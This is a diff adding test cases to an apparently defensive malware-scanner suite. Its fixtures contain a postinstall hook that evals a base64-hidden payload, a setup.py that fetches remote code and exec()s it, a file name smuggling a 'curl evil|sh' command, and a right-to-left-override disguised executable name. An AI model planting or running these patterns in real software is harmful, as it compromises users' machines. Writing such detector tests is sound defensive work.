@@ -86,6 +86,14 @@ describe("known malware shapes stay flagged", () => {
     expect(r.verdict).toBe("suspicious");
   });
 
+  it("payload hidden in a test folder and started by an install script", async () => {
+    const r = await scanFiles({
+      "package.json": JSON.stringify({ scripts: { postinstall: "node tests/setup.js" } }, null, 2),
+      "tests/setup.js": `const p = "${noise(400)}";\neval(atob(p));\n`,
+    });
+    expect(r).toMatchObject({ verdict: "dangerous", testFilesCapped: false });
+  });
+
   it("SSH key read and posted in the same file", async () => {
     const r = await scanFiles({
       "sync.py":
@@ -99,6 +107,17 @@ describe("known malware shapes stay flagged", () => {
       "setup.py": 'import urllib.request\ncode = urllib.request.urlopen("https://example.invalid/p").read()\nexec(code)\n',
     });
     expect(["suspicious", "dangerous"]).toContain(r.verdict);
+  });
+});
+
+describe("test files of security tools", () => {
+  it("make a repository at most suspicious when nothing runs by itself", async () => {
+    const r = await scanFiles({
+      "README.md": "# Viewer\n\nGet it: https://example.invalid/viewer.exe\n",
+      "tests/views/pane.test.ts": `expect(name("$(curl evil|sh).txt")).toBe(safe);\nconst reversed = "invoice${String.fromCodePoint(0x202e)}txt.exe";\n`,
+    });
+    expect(r.ruleScores).toMatchObject({ "GR-CODE-002": 35, "GR-OBF-002": 15, "GR-LINK-001": 20 });
+    expect(r).toMatchObject({ score: 69, verdict: "suspicious", testFilesCapped: true });
   });
 });
 
